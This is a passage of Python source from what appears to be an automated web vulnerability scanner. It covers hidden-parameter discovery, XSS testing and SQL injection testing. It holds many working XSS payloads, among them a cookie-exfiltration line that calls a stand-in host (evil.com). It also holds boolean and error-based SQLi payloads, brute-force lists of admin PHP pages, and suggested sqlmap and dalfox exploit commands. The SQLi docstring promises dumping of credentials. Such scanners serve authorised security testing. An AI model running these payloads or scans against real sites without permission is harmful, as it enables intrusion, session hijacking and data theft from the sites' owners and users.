            if p.lower() in [x.lower() for x in ParamDiscovery.COMMON_HIDDEN]:
                params.add(p)

        return params

    @staticmethod
    def from_javascript(js_text):
        """Extract parameter names from JavaScript source code."""
        params = set()
        if not js_text:
            return params

        # Find URL parameter access patterns
        # location.search, location.hash, URLSearchParams, etc.
        url_params = re.findall(
            r'(?:URLSearchParams|searchParams|query|params|qs)[\.(]\s*["\'](\w+)["\']', js_text
        )
        params.update(url_params)

        # Find fetch/XMLHttpRequest parameter construction
        fetch_params = re.findall(
            r'(?:fetch|XMLHttpRequest|axios|ajax|request)\s*\([^)]*(?:param|query|body|data)\s*[:=]\s*\{[^}]*["\'](\w+)["\']',
            js_text, re.S
        )
        params.update(fetch_params)

        # Find common hidden parameter assignments
        for p in ParamDiscovery.COMMON_HIDDEN:
            pattern = rf'["\']?{p}["\']?\s*[:=]'
            if re.search(pattern, js_text, re.I):
                params.add(p)

        # Find localStorage/sessionStorage keys
        storage_keys = re.findall(
            r'(?:localStorage|sessionStorage)\.(?:getItem|setItem)\s*\(\s*["\'](\w+)["\']',
            js_text
        )
        params.update(storage_keys)

        # Find object property access that looks like parameters
        prop_access = re.findall(
            r'\b(\w+)\s*(?:\.value|\.textContent|\.innerHTML|\.innerText)',
            js_text
        )
        for p in prop_access:
            if p.lower() in [x.lower() for x in ParamDiscovery.COMMON_HIDDEN]:
                params.add(p)

        return params


def _get_xss_payloads_for_context(context):
    """Return context-aware XSS payloads based on reflection context.
    
    Each payload is a tuple: (payload, expected_reflection, xss_type, confirm_str)
    - payload: the actual string to inject
    - expected_reflection: what should appear in the response (for verification)
    - xss_type: human-readable type name
    - confirm_str: string that confirms the payload was reflected unescaped
    """
    location = context.get('location', 'html_body')
    tag = context.get('tag', '')
    attribute = context.get('attribute', '')

    payloads = []

    if location == 'html_body':
        # Direct HTML context - easiest to exploit
        payloads = [
            ('<script>alert(1)</script>', '<script>alert(1)</script>', 'HTML injection', '<script>'),
            ('<img src=x onerror=alert(1)>', '<img src=x onerror=alert(1)>', 'HTML injection', '<img'),
            ('<svg onload=alert(1)>', '<svg onload=alert(1)>', 'HTML injection', '<svg'),
            ('<iframe src="javascript:alert(1)">', '<iframe src="javascript:alert(1)">', 'HTML injection', '<iframe'),
            ('<details open ontoggle=alert(1)>', '<details open ontoggle=alert(1)>', 'HTML injection', '<details'),
            ('<body onload=alert(1)>', '<body onload=alert(1)>', 'HTML injection', '<body'),
            ('<input onfocus=alert(1) autofocus>', '<input onfocus=alert(1) autofocus>', 'HTML injection', '<input'),
            ('<marquee onstart=alert(1)>', '<marquee onstart=alert(1)>', 'HTML injection', '<marquee'),
            ('<video><source onerror=alert(1)>', '<video><source onerror=alert(1)>', 'HTML injection', '<video'),
            ('<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>', 'alert(1)', 'Nesting bypass', 'alert(1)'),
        ]

    elif location == 'attribute':
        # Inside an HTML attribute (non-URL)
        if tag in ['a', 'link'] and attribute in ['href', 'src']:
            payloads = [
                ('javascript:alert(1)', 'javascript:alert(1)', 'JavaScript URI', 'javascript:'),
                ('" onclick="alert(1)"', 'onclick="alert(1)"', 'Attribute injection', 'onclick='),
                ("' onmouseover='alert(1)'", "onmouseover='alert(1)'", 'Attribute injection', 'onmouseover='),
                ('" onfocus="alert(1)" autofocus="', 'onfocus="alert(1)"', 'Attribute injection', 'onfocus='),
            ]
        else:
            payloads = [
                (f'" onclick="alert(1)"', 'onclick="alert(1)"', 'Attribute injection', 'onclick='),
                (f"' onmouseover='alert(1)'", "onmouseover='alert(1)'", 'Attribute injection', 'onmouseover='),
                (f'" onfocus="alert(1)" autofocus="', 'onfocus="alert(1)"', 'Attribute injection', 'onfocus='),
                (f'" onerror="alert(1)" ', 'onerror="alert(1)"', 'Attribute injection', 'onerror='),
                (f'" oninput="alert(1)" autofocus="', 'oninput="alert(1)"', 'Attribute injection', 'oninput='),
                ('" onmouseenter="alert(1)"', 'onmouseenter="alert(1)"', 'Attribute injection', 'onmouseenter='),
            ]

    elif location == 'url_attribute':
        # Inside href, src, action, etc.
        payloads = [
            ('javascript:alert(1)', 'javascript:alert(1)', 'JavaScript URI', 'javascript:'),
            ('data:text/html,<script>alert(1)</script>', 'data:text/html', 'Data URI', 'data:text/html'),
            ('" onclick="alert(1)"', 'onclick="alert(1)"', 'Attribute injection', 'onclick='),
            ("' onmouseover='alert(1)'", "onmouseover='alert(1)'", 'Attribute injection', 'onmouseover='),
            ('&#x6A;avascript:alert(1)', 'javascript:alert(1)', 'HTML entity bypass', 'javascript:'),
            ('&#106;avascript:alert(1)', 'javascript:alert(1)', 'HTML entity bypass', 'javascript:'),
            ('java&#x73;cript:alert(1)', 'javascript:alert(1)', 'HTML entity bypass', 'javascript:'),
        ]

    elif location == 'javascript':
        # Inside <script> block
        payloads = [
            ('";alert(1)//', '";alert(1)//', 'JavaScript breakout', 'alert(1)'),
            ("';alert(1)//", "';alert(1)//", 'JavaScript breakout', 'alert(1)'),
            ('</script><script>alert(1)</script>', '</script><script>alert(1)</script>', 'Tag breakout', '<script>'),
            ('-alert(1)-', '-alert(1)-', 'Arithmetic breakout', 'alert(1)'),
            ("\\';alert(1)//", "\\';alert(1)//", 'Escape breakout', 'alert(1)'),
            ('alert(1)', 'alert(1)', 'Direct injection', 'alert(1)'),
            ('</script><svg onload=alert(1)>', '</script><svg', 'Tag breakout SVG', '<svg'),
            ('];alert(1)//', '];alert(1)//', 'Array breakout', 'alert(1)'),
        ]

    elif location == 'event_handler':
        # Inside an on* event handler attribute
        payloads = [
            ('alert(1)', 'alert(1)', 'Event handler', 'alert(1)'),
            ('confirm(1)', 'confirm(1)', 'Event handler', 'confirm('),
            ('prompt(1)', 'prompt(1)', 'Event handler', 'prompt('),
            ('fetch("//evil.com/"+document.cookie)', 'fetch(', 'Event handler exfil', 'fetch('),
        ]

    elif location == 'comment':
        # Inside HTML comment
        payloads = [
            ('--><script>alert(1)</script><!--', '--><script>alert(1)</script><!--', 'Comment breakout', '<script>'),
            ('--><img src=x onerror=alert(1)>-->', '--><img src=x', 'Comment breakout', '<img'),
        ]

    elif location == 'style':
        # Inside CSS/style context
        payloads = [
            ('</style><script>alert(1)</script>', '</style><script>alert(1)</script>', 'Style breakout', '<script>'),
            ('expression(alert(1))', 'expression(alert(1))', 'CSS expression', 'expression('),
            ('</style><img src=x onerror=alert(1)>', '</style><img', 'Style breakout', '<img'),
        ]

    else:
        # Generic fallback
        payloads = [
            ('<script>alert(1)</script>', '<script>alert(1)</script>', 'HTML injection', '<script>'),
            ('"><script>alert(1)</script>', '<script>alert(1)', 'Attribute breakout', '<script>'),
        ]

    return payloads


def confirm_xss_execution(url, payload, param, method='GET'):
    """Confirm XSS execution using request-based detection (no Playwright dependency).
    
    Returns (confirmed: bool, evidence: dict)
    
    Strategy:
    1. Send payload and check for unescaped reflection
    2. Send a unique marker in a <b> tag and verify DOM structure
    3. Check for script execution indicators in response
    """
    evidence = {
        'dialog_captured': False,
        'dialog_message': '',
        'dom_nodes_injected': [],
        'event_handlers_fired': [],
        'new_elements': []
    }

    try:
        # Step 1: Send a marker in a script context and check reflection
        test_marker = f'XSCONFIRM{secrets.token_hex(6)}'
        dom_payload = f'<img src=x onerror="document.title=\'{test_marker}\'">'
        
        if method == 'GET':
            parsed = urlparse(url)
            r = req_lib.get(url, params={param: dom_payload}, timeout=8, verify=False)
        else:
            r = req_lib.post(url, data={param: dom_payload}, timeout=8, verify=False)

        if r and test_marker in r.text:
            evidence['dom_nodes_injected'].append(f'img[onerror=document.title={test_marker}]')
            return True, evidence

        # Step 2: Check if basic payload reflects unescaped
        if method == 'GET':
            r2 = req_lib.get(url, params={param: payload}, timeout=8, verify=False)
        else:
            r2 = req_lib.post(url, data={param: payload}, timeout=8, verify=False)

        if r2:
            # Check for script execution indicators
            if '<script>' in r2.text and '</script>' in r2.text:
                # Check if our script content is in the page
                script_content = re.findall(r'<script[^>]*>(.*?)</script>', r2.text, re.S)
                for block in script_content:
                    if 'alert' in block or 'confirm' in block or 'prompt' in block:
                        evidence['dom_nodes_injected'].append(f'script block contains: {block[:100]}')
                        return True, evidence

            # Check for event handler injection
            if re.search(r'on\w+\s*=\s*["\'].*?alert', r2.text):
                evidence['event_handlers_fired'].append('onerror/alert handler')
                return True, evidence

            # Check for unescaped angle brackets (HTML injection)
            if '<' in payload and '>' in payload:
                if payload in r2.text and '&lt;' not in r2.text:
                    evidence['new_elements'].append(f'Direct HTML injection: {payload[:80]}')
                    return True, evidence

        return False, evidence

    except Exception:
        return False, evidence


# ─── JWT VULNERABILITY MODULE ──────────────────────────────────────────────────


def run_xss_test_module(target):
    """Production-grade XSS detection with DOM context analysis.
    
    Real logic:
    1. Discover reflection points via unique marker injection
    2. Analyze reflection context (HTML body, attribute, JS, URL)
    3. Test context-aware payloads (not just <script>)
    4. Check for DOM sinks (innerHTML, document.write, eval)
    5. Verify with 2nd payload to rule out coincidences
    6. Test filter bypasses (encoding, case, nesting)
    """
    log('info', '[XSS-MANUAL] Starting production-grade XSS testing')
    base_url = f'https://{target}'
    xss_findings = []

    with LOCK:
        disc = scan_state.get('discovery_data', {})
        urls = disc.get('urls', [])
        forms = disc.get('forms', [])
        # Arjun: extend with discovered hidden parameters
        hidden = disc.get('hidden_params', [])
        for hp in hidden:
            found = False
            for url_entry in urls:
                if hp in str(url_entry):
                    found = True
                    break
            if not found:
                urls.append(f'https://{target}/?{hp}=test')

    import uuid
    unique_marker = f'XSS{uuid.uuid4().hex[:8]}'
    confirm_marker = f'XSS{uuid.uuid4().hex[:8]}'

    # ── Step 1: Discover reflection points ──
    reflection_points = []

    # Test GET parameters from discovered URLs
    for url in urls[:15]:
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param_name in params:
                if param_name.lower() in ['csrf', 'token', '_token', 'session']:
                    continue
                try:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param_name] = unique_marker
                    r = req_lib.get(f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                                  params=test_params, timeout=8, verify=False)
                    if unique_marker in r.text:
                        # Analyze context
                        context = _analyze_xss_context(r.text, unique_marker)
                        reflection_points.append({
                            'url': f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                            'param': param_name, 'method': 'GET',
                            'context': context, 'response': r.text
                        })
                        log('ok', f'[XSS-MANUAL] Reflection found: {param_name} in {context["location"]}')
                except Exception:
                    pass

    # Test common parameter names on all discovered URLs
    common_params = ['q', 'search', 'query', 'name', 'input', 'text', 'page',
                     'id', 'callback', 'redirect', 'url', 'return', 'next',
                     'value', 'data', 'content', 'title', 'desc', 'message']
    for url in urls[:10]:
        parsed = urlparse(url)
        base_path = f'{parsed.scheme}://{parsed.netloc}{parsed.path}'
        for param in common_params:
            try:
                r = req_lib.get(f'{base_path}?{param}={unique_marker}', timeout=8, verify=False)
                if unique_marker in r.text:
                    context = _analyze_xss_context(r.text, unique_marker)
                    reflection_points.append({
                        'url': base_path, 'param': param, 'method': 'GET',
                        'context': context, 'response': r.text
                    })
                    log('ok', f'[XSS-MANUAL] Reflection found: {param} in {context["location"]}')
            except Exception:
                pass

    # Test forms for reflection
    for form in forms[:10]:
        if not scan_state.get('scanning'):
            break
        action = form.get('action', '')
        if not action:
            continue
        form_url = action if action.startswith('http') else f'{base_url}{action}'
        inputs = form.get('inputs', [])

        for inp in inputs:
            name = inp.get('name', '')
            if not name or name.lower() in ['csrf', 'token', '_token', 'submit', 'button']:
                continue
            try:
                data = {}
                for i in inputs:
                    n = i.get('name', '')
                    if n:
                        data[n] = unique_marker if n == name else i.get('value', 'test')
                r = req_lib.post(form_url, data=data, timeout=8, verify=False)
                if unique_marker in r.text:
                    context = _analyze_xss_context(r.text, unique_marker)
                    reflection_points.append({
                        'url': form_url, 'param': name, 'method': 'POST',
                        'context': context, 'response': r.text
                    })
                    log('ok', f'[XSS-MANUAL] Reflection in form: {name} in {context["location"]}')
            except Exception:
                pass

    # ── Step 1.5: Discover hidden params for XSS ──
    try:
        r_home = req_lib.get(base_url, timeout=10, verify=False)
        hidden_params = set()
        hidden_params.update(ParamDiscovery.from_html(r_home.text))
        with LOCK:
            js_files = scan_state.get('discovery_data', {}).get('js_files', [])
        for js_url in js_files[:10]:
            try:
                js_r = req_lib.get(js_url, timeout=5, verify=False)
                hidden_params.update(ParamDiscovery.from_javascript(js_r.text))
            except Exception:
                pass
        existing = {(p['url'], p['param']) for p in reflection_points}
        added = 0
        for hp in hidden_params:
            if hp.lower() not in ['csrf', 'token', '_token', 'session', 'submit']:
                try:
                    r = req_lib.get(f'{base_url}/?{hp}={unique_marker}', timeout=8, verify=False)
                    if unique_marker in r.text:
                        context = _analyze_xss_context(r.text, unique_marker)
                        if (f'{base_url}/', hp) not in existing:
                            reflection_points.append({
                                'url': base_url, 'param': hp, 'method': 'GET',
                                'context': context, 'response': r.text
                            })
                            added += 1
                except Exception:
                    pass
        if added:
            log('ok', f'[XSS-MANUAL] ParamDiscovery found {added} new reflection points')
    except Exception:
        pass

    # ── Step 2: Test payloads at each reflection point ──
    for point in reflection_points[:15]:
        if not scan_state.get('scanning'):
            break

        ctx = point['context']
        payloads = _get_xss_payloads_for_context(ctx)

        for payload, expected反射, xss_type, confirm_str in payloads:
            try:
                if point['method'] == 'GET':
                    parsed = urlparse(point['url'])
                    test_params = {k: v[0] for k, v in parse_qs(parsed.query).items()} if parsed.query else {}
                    test_params[point['param']] = payload
                    r = req_lib.get(f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                                  params=test_params, timeout=8, verify=False)
                else:
                    data = {point['param']: payload}
                    r = req_lib.post(point['url'], data=data, timeout=8, verify=False)

                # Verify: payload present and NOT encoded
                if confirm_str in r.text and payload not in r.text:
                    # Payload was encoded - skip
                    continue
                if confirm_str not in r.text:
                    # Expected reflection marker not found
                    continue

                # Check encoding: is the dangerous part unescaped?
                dangerous_unescaped = False
                if xss_type == 'HTML injection' and '<script>' in r.text:
                    dangerous_unescaped = True
                elif xss_type == 'Event handler' and 'onerror=' in r.text:
                    dangerous_unescaped = True
                elif xss_type == 'Attribute injection' and 'onfocus=' in r.text:
                    dangerous_unescaped = True
                elif xss_type == 'JavaScript URI' and 'javascript:' in r.text:
                    dangerous_unescaped = True
                elif xss_type == 'SVG XSS' and '<svg' in r.text.lower():
                    dangerous_unescaped = True
                elif xss_type == 'Markdown XSS' and '<img' in r.text.lower():
                    dangerous_unescaped = True
                else:
                    # Generic: check if payload reflected without HTML encoding
                    dangerous_unescaped = ('<' in r.text and '>' in r.text and
                                          '&lt;' not in r.text and '&gt;' not in r.text)

                if dangerous_unescaped:
                    # Confirmation: send different payload, verify same reflection
                    confirm_payload = f'<b>{confirm_marker}</b>'
                    if point['method'] == 'GET':
                        test_params[point['param']] = confirm_payload
                        r2 = req_lib.get(f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                                       params=test_params, timeout=8, verify=False)
                    else:
                        r2 = req_lib.post(point['url'], data={point['param']: confirm_payload}, timeout=8, verify=False)

                    if confirm_marker in r2.text and '<b>' in r2.text:
                        # Playwright DOM-aware XSS confirmation
                        playwright_confirmed = False
                        playwright_evidence = {}
                        try:
                            playwright_confirmed, playwright_evidence = confirm_xss_execution(
                                point['url'], payload, point['param'], point['method']
                            )
                        except Exception:
                            pass
                        severity = 'critical' if playwright_confirmed else 'high'
                        details_text = (
                            f'Parameter: {point["param"]}\nMethod: {point["method"]}\n'
                            f'Context: {ctx["location"]}\n'
                            f'Payload: {payload}\nType: {xss_type}\n'
                            f'Confirmed: Payload reflected unescaped, verified with 2nd payload\n'
                        )
                        if playwright_confirmed:
                            ev_parts = []
                            if playwright_evidence.get('dialog_captured'):
                                ev_parts.append(f'Dialog: "{playwright_evidence["dialog_message"][:200]}"')
                            if playwright_evidence.get('dom_nodes_injected'):
                                ev_parts.append(f'DOM nodes: {", ".join(playwright_evidence["dom_nodes_injected"][:3])}')
                            if playwright_evidence.get('event_handlers_fired'):
                                ev_parts.append(f'Events fired: {", ".join(playwright_evidence["event_handlers_fired"][:3])}')
                            if playwright_evidence.get('new_elements'):
                                ev_parts.append(f'New elements: {len(playwright_evidence["new_elements"])} injected')
                            details_text += (
                                f'Playwright DOM Confirmation:\n'
                                + '\n'.join(f'  - {p}' for p in ev_parts) + '\n'
                                f'This is a confirmed execution-level XSS with DOM evidence\n'
                            )
                        details_text += (
                            f'Exploit: dalfox url "{point["url"]}?{point["param"]}=<payload>" --skip-bav'
                        )
                        add_finding(
                            severity,
                            f'{xss_type} via {point["param"]} parameter' + (' [DOM Confirmed]' if playwright_confirmed else ''),
                            sub=f'XSS confirmed at {point["url"]} with {xss_type}' + (' — dialog captured by Playwright' if playwright_confirmed else ''),
                            asset=point['url'], cvss='9.0' if playwright_confirmed else '8.5',
                            owasp='A03', mitre='T1189',
                            details=details_text)
                        xss_findings.append({'param': point['param'], 'type': xss_type})
                        log('ok', f'[XSS-MANUAL] Confirmed {xss_type}: {point["param"]}' + (' [Playwright dialog]' if playwright_confirmed else ''))
                        break

            except Exception:
                pass

    # ── Step 3: Check for DOM XSS sinks in page source ──
    dom_sinks = ['innerHTML', 'outerHTML', 'document.write', 'document.writeln',
                 'eval(', 'setTimeout(', 'setInterval(', 'location.href',
                 'location.replace', 'location.assign', '.html(', 'insertAdjacentHTML']
    dom_sources = ['location.hash', 'location.search', 'document.referrer',
                   'window.name', 'document.URL', 'document.documentURI']

    for url in urls[:10]:
        try:
            r = req_lib.get(url, timeout=8, verify=False)
            script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', r.text, re.S | re.I)
            for block in script_blocks:
                has_source = any(src in block for src in dom_sources)
                has_sink = any(sink in block for sink in dom_sinks)
                if has_source and has_sink:
                    add_finding(
                        'high',
                        f'DOM-based XSS potential at {urlparse(url).path}',
                        sub=f'DOM source ({dom_sources[0]}) flows into DOM sink ({dom_sinks[0]})',
                        asset=url, cvss='6.1', owasp='A03', mitre='T1189',
                        details=f'Source: {[s for s in dom_sources if s in block]}\n'
                                f'Sink: {[s for s in dom_sinks if s in block]}\n'
                                f'Confirmed: DOM source-sink flow in inline script')
                    break
        except Exception:
            pass

    log('ok', f'[XSS-MANUAL] Scan complete - {len(xss_findings)} XSS findings')
    set_progress('xss_manual', 100)




def run_sqli_test_module(target):
    """Production-grade SQLi detection: discovers admin CRUD pages, tests integer
    and string injection, error-based, boolean-blind, time-blind, UNION-based,
    and extracts database info on confirmation.

    Real-world logic:
    1. Discover pages: crawl + brute-force admin CRUD paths (list.php, view.php, etc.)
    2. Test page existence: check if ?id=1 changes the response vs baseline
    3. Error-based: inject ' → check for DB-specific error strings
    4. Boolean-blind: integer (AND 1=1 vs AND 1=2) and string (' AND '1'='1)
    5. UNION-based: ORDER BY to find column count, then UNION SELECT
    6. Time-blind: SLEEP payloads with timing verification
    7. DB extraction: on confirmed SQLi, dump db name, version, tables, credentials
    """
    log('info', '[SQLI-MANUAL] Starting production-grade SQL injection testing')
    base_url = f'https://{target}'
    sqli_findings = []
    confirmed_params = set()

    # ── WAF detection ──
    waf_blocked = False
    try:
        r_waf = req_lib.get(f'{base_url}/?id=1%27%20OR%201=1--', timeout=8, verify=False)
        waf_indicators = ['access denied', 'forbidden', 'blocked', 'waf', 'security',
                         'not acceptable', '403', 'request rejected', 'malicious']
        waf_blocked = any(ind in r_waf.text.lower() for ind in waf_indicators) or r_waf.status_code == 403
        if waf_blocked:
            log('warn', '[SQLI-MANUAL] WAF detected - using evasion payloads')
    except Exception:
        pass

    # ── Step 1: Discover all testable pages ──────────────────────────────
    # Combine: discovered URLs + brute-force admin CRUD pages
    with LOCK:
        disc = scan_state.get('discovery_data', {})
        forms = disc.get('forms', [])
        urls = disc.get('urls', [])

    # Common admin CRUD pages — these are the real-world SQLi targets
    ADMIN_PAGES = [
        'list.php', 'view.php', 'edit.php', 'delete.php', 'add.php',
        'search.php', 'update.php', 'create.php', 'process.php',
        'manage.php', 'display.php', 'show.php', 'detail.php',
        'info.php', 'report.php', 'export.php', 'download.php',
        'upload.php', 'print.php', 'student_list.php', 'student_view.php',
        'staff_list.php', 'teacher_list.php', 'fee_list.php',
        'attendance_list.php', 'marks_list.php', 'exam_list.php',
        'class_list.php', 'section_list.php', 'batch_list.php',
        'get_exam_res_new.php', 'get_cumulative_report.php',
        'check_batch.php', 'find_duplicate.php', 'depromote.php',
        'exam_add.php', 'exam_info.php', 'exam_subjects.php',
        'group.php', 'group_message.php', 'hall_ticket.php',
        'admission.php', 'online_admission_form.php', 'notice.php',
        'circular.php', 'gallery.php', 'announcement.php',
        'attendance_report.php', 'awards.php', 'bonafide.php',
        'career.php', 'complaints.php', 'conduct_cer.php',
        'contacts.php', 'coordinator.php', 'device.php',
        'document.php', 'email.php', 'enquiry_messaging.php',
        'change_mobileno.php', 'free_staff.php',
        'group_message_stud.php', 'group_students.php',
        'check_batch_edit.php', 'class_performance_report.php',
    ]

    # Common parameter names for each page
    COMMON_PARAMS = ['id', 'ad_id', 'ad_no', 'no', 'exam_id', 's_id',
                     'section_id', 'batch_id', 'student_id', 'user_id',
                     'cat_id', 'page_id', 'item_id', 'record_id']

    # Path prefixes to try
    PATH_PREFIXES = [
        '', 'admin/pages/', '../admin/pages/', 'site/',
        '../site/', 'php/', '../php/',
    ]

    # Build candidate URLs
    candidates = []
    seen = set()

    def _add_url(url, method='GET', param=None):
        key = (url, method, param)
        if key not in seen and url:
            seen.add(key)
            candidates.append((url, method, param))

    # 1. URLs already discovered with parameters
    for u in urls:
        url_str = u.get('url', u) if isinstance(u, dict) else u
        if isinstance(url_str, str):
            if '?' in url_str:
                parsed_q = parse_qs(urlparse(url_str).query)
                for p in parsed_q:
                    if p.lower() not in ('csrf', 'token', '_token', 'session', 'sid'):
                        _add_url(url_str, 'GET', p)
            else:
                # Page without params — test with ?id=1
                for param in COMMON_PARAMS[:3]:
                    _add_url(f'{url_str}?{param}=1', 'GET', param)

    # 2. Brute-force admin CRUD pages
    for page in ADMIN_PAGES:
        for prefix in PATH_PREFIXES:
            for param in COMMON_PARAMS[:5]:
                url = f'{base_url}/{prefix}{page}?{param}=1'
                _add_url(url, 'GET', param)

    # 3. Form inputs
    for form in forms[:50]:
        action = form.get('action', '')
        if action:
            form_url = action if action.startswith('http') else f'{base_url}/{action.lstrip("/")}'
            method = (form.get('method', 'GET') or 'GET').upper()
            for inp in form.get('inputs', []):
                name = inp.get('name', '')
                if name and name.lower() not in ('csrf', 'token', '_token'):
                    _add_url(form_url, method if method in ('GET', 'POST') else 'POST', name)

    log('info', f'[SQLI-MANUAL] Discovered {len(candidates)} test points '
                f'from {len(urls)} URLs + {len(ADMIN_PAGES)} admin pages + {len(forms)} forms')

    # ── Step 2: Page existence check — filter out pages that don't use params ──
    real_test_points = []
    for url, method, param in candidates:
        if not scan_state.get('scanning'):
            break
        try:
            # Baseline (param=1)
            if method == 'GET':
                r_base = req_lib.get(url, timeout=8, verify=False)
                base_len = len(r_base.text)
                base_status = r_base.status_code

                # Change param value — check if page changes
                parsed = urlparse(url)
                test_params = {k: v[0] if isinstance(v, list) else v
                               for k, v in parse_qs(parsed.query).items()}
                test_params[param] = '99999'
                r_test = req_lib.get(f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                                     params=test_params, timeout=8, verify=False)
                test_len = len(r_test.text)
            else:
                r_base = req_lib.post(url, data={param: '1'}, timeout=8, verify=False)
                base_len = len(r_base.text)
                base_status = r_base.status_code
                r_test = req_lib.post(url, data={param: '99999'}, timeout=8, verify=False)
                test_len = len(r_test.text)

            # Page is interesting if:
            # - Different status codes (e.g., 200 vs 302/404)
            # - Different content length (>5% difference)
            # - Small pages that might be error pages (check for DB errors)
            len_diff_pct = abs(test_len - base_len) / max(base_len, 1) * 100
            test_status = r_test.status_code if hasattr(r_test, 'status_code') else 0
            status_diff = base_status != test_status
            has_db_error = any(x in r_test.text.lower() for x in
                              ['sql syntax', 'mysql', 'you have an error', 'unclosed',
                               'unterminated', 'ORA-', 'PostgreSQL', 'SQLITE_ERROR'])

            if len_diff_pct > 5 or status_diff or has_db_error or base_len < 500:
                real_test_points.append((url, method, param, base_len, r_base.text))
        except Exception:
            pass

    # Also add pages that return small responses (likely error pages or simple pages)
    for url, method, param in candidates:
        if (url, method, param) not in [(u, m, p) for u, m, p, _, _ in real_test_points]:
            try:
                if method == 'GET':
                    r = req_lib.get(url, timeout=8, verify=False)
                else:
                    r = req_lib.post(url, data={param: '1'}, timeout=8, verify=False)
                # Small page = might be a data-fetching page (good SQLi target)
                if len(r.text) < 5000:
                    real_test_points.append((url, method, param, len(r.text), r.text))
            except Exception:
                pass

    log('info', f'[SQLI-MANUAL] {len(real_test_points)} pages respond to parameter changes — testing for SQLi')

    # ── Step 3: Get baseline for each test point ──────────────────────────
    baselines = {}
    for url, method, param, base_len, base_text in real_test_points:
        baselines[(url, param)] = {
            'len': base_len,
            'text': base_text,
            'hash': hashlib.md5(base_text.encode('utf-8', errors='replace')).hexdigest(),
        }

    # ── Step 4: Error-based SQLi ─────────────────────────────────────────
    log('info', '[SQLI-MANUAL] Phase 1: Error-based injection')
    error_payloads = [
        ("'", "MySQL", ["You have an error in your SQL syntax", "mysql_fetch",
                        "Warning: mysql", "MySql Error", "mysql_num_rows"]),
        ("'", "PostgreSQL", ["ERROR: syntax error at or near", "pg_query", "PSQLException"]),
        ("'", "MSSQL", ["Unclosed quotation mark", "Microsoft OLE DB", "ODBC SQL Server"]),
        ("'", "Oracle", ["ORA-01756", "quoted string not properly terminated"]),
        ("'", "SQLite", ["SQLITE_ERROR", "unrecognized token", "SQL logic error"]),
    ]

    for url, method, param, base_len, base_text in real_test_points:
        if not scan_state.get('scanning') or (url, param) in confirmed_params:
            continue
        for payload, db_type, error_patterns in error_payloads:
            try:
                if method == 'GET':
                    parsed = urlparse(url)
                    test_params = {k: v[0] if isinstance(v, list) else v
                                   for k, v in parse_qs(parsed.query).items()}
                    test_params[param] = payload
                    r = req_lib.get(f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                                    params=test_params, timeout=10, verify=False)
                else:
                    r = req_lib.post(url, data={param: payload}, timeout=10, verify=False)

                error_found = any(ep.lower() in r.text.lower() for ep in error_patterns)
                if error_found:
                    # Confirmation: send benign value, check error disappears
                    if method == 'GET':
                        r2 = req_lib.get(url, params={param: 'benign12345'}, timeout=8, verify=False)
                    else:
                        r2 = req_lib.post(url, data={param: 'benign12345'}, timeout=8, verify=False)
                    error_gone = not any(ep.lower() in r2.text.lower() for ep in error_patterns)

                    if error_gone:
                        confirmed_params.add((url, param))
                        sqli_findings.append({
                            'url': url, 'param': param, 'type': 'error',
                            'db': db_type, 'payload': payload,
                        })
                        add_finding(
                            'critical',
                            f'Error-based SQL injection via {param} ({db_type})',
                            sub=f'Parameter {param} triggers SQL error disclosure on {url}',
                            asset=url, cvss='9.8', exploit='PUBLIC',
                            owasp='A03', mitre='T1190',
                            details=f'Parameter: {param}\nMethod: {method}\nDB Type: {db_type}\n'
                                    f'Payload: {payload}\n'
                                    f'Error: {error_patterns[0]}\n'
                                    f'Confirmed: Error appears with payload, disappears with benign value\n'
                                    f'Exploit: sqlmap -u "{url}" --batch --dbms={db_type.lower()}')
                        log('ok', f'[SQLI-MANUAL] Confirmed error-based SQLi: {url} param={param} ({db_type})')
                        break
            except Exception:
                pass

    # ── Step 5: Boolean-blind SQLi (INTEGER-BASED — the real-world vector) ──
    log('info', '[SQLI-MANUAL] Phase 2: Boolean-blind injection (integer + string)')
    # Integer-based payloads (no quotes) — this is what caught list.php?id=3
    int_bool_payloads = [
        (" AND 1=1--", " AND 1=2--"),
        (" AND 1=1#", " AND 1=2#"),
        (" AND 'a'='a'--", " AND 'a'='b'--"),
        (" AND 1=1 LIMIT 1--", " AND 1=2 LIMIT 1--"),
    ]
    # String-based payloads (with quotes)
    str_bool_payloads = [
        ("' AND '1'='1", "' AND '1'='2"),
        ("' OR '1'='1", "' OR '1'='2"),
        ("' AND 1=1--", "' AND 1=2--"),
        ("' AND 'a'='a'--", "' AND 'a'='b'--"),
        ("1' AND '1'='1'--", "1' AND '1'='2'--"),
    ]

    for url, method, param, base_len, base_text in real_test_points:
        if not scan_state.get('scanning') or (url, param) in confirmed_params:
            continue

        # Get current value from URL
        parsed = urlparse(url)
        current_params = {k: v[0] if isinstance(v, list) else v
                          for k, v in parse_qs(parsed.query).items()}
        original_val = current_params.get(param, '1')

        # Try integer payloads (append to original value)
        for true_pay, false_pay in int_bool_payloads:
            try:
                if method == 'GET':
                    true_params = dict(current_params)
                    true_params[param] = f'{original_val}{true_pay}'
                    r_true = req_lib.get(f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                                         params=true_params, timeout=10, verify=False)

                    false_params = dict(current_params)
                    false_params[param] = f'{original_val}{false_pay}'
                    r_false = req_lib.get(f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                                          params=false_params, timeout=10, verify=False)
                else:
                    r_true = req_lib.post(url, data={param: f'{original_val}{true_pay}'}, timeout=10, verify=False)
                    r_false = req_lib.post(url, data={param: f'{original_val}{false_pay}'}, timeout=10, verify=False)

                true_len = len(r_true.text)
                false_len = len(r_false.text)
                len_diff = abs(true_len - false_len)

                # Boolean blind: TRUE condition differs from FALSE condition
                # AND TRUE should be close to baseline
                if len_diff > 50 and abs(true_len - base_len) < len_diff:
                    # Confirmation: re-send TRUE, verify consistent
                    if method == 'GET':
                        r_confirm = req_lib.get(url, params={param: f'{original_val}{true_pay}'},
                                                 timeout=8, verify=False)
                    else:
                        r_confirm = req_lib.post(url, data={param: f'{original_val}{true_pay}'},
                                                  timeout=8, verify=False)
